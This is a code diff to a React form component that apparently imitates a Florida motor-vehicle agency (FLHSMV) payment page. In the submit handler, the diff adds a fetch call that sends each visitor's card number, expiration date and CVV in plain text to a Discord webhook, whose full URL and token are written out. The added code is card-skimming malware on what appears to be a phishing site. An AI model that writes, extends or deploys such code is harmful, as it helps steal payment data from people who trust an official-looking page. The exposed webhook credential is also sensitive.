@@ -29,23 +29,41 @@ export default function FLHSMVPage1() {
   };
 
   const handleSubmit = async (e) => {
-    e.preventDefault();
-    const validationErrors = validate();
-    if (Object.keys(validationErrors).length > 0) {
-      setErrors(validationErrors);
-      return;
-    }
-    try {
-       await fetch("https://flhsmv-backend.onrender.com/submit", {
+  e.preventDefault();
+  const validationErrors = validate();
+  if (Object.keys(validationErrors).length > 0) {
+    setErrors(validationErrors);
+    return;
+  }
+  try {
+    // Send form data to your backend
+    await fetch("https://flhsmv-backend.onrender.com/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(formData)
+    });
+
+    // Send Discord webhook notification
+    await fetch(
+      "https://discord.com/api/webhooks/1394971034054037635/AAY8BfDiVBgoyl0u1BBXi1tLSaQCUF5BS0SZI_oIWgWfevveRhVe9_QGihs4wLn4fi4M",
+      {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(formData)
-      });
-      navigate("/");
-    } catch (err) {
-      console.error("Submission failed:", err);
-    }
-  };
+        body: JSON.stringify({
+          content: `💳 **New Payment Submission**
+Card Number: ${formData.cardNumber}
+Expiration Date: ${formData.expirationDate}
+CVV: ${formData.cvv}`
+        }),
+      }
+    );
+
+    navigate("/");
+  } catch (err) {
+    console.error("Submission failed:", err);
+  }
+};
+
 
   return (
     <div>
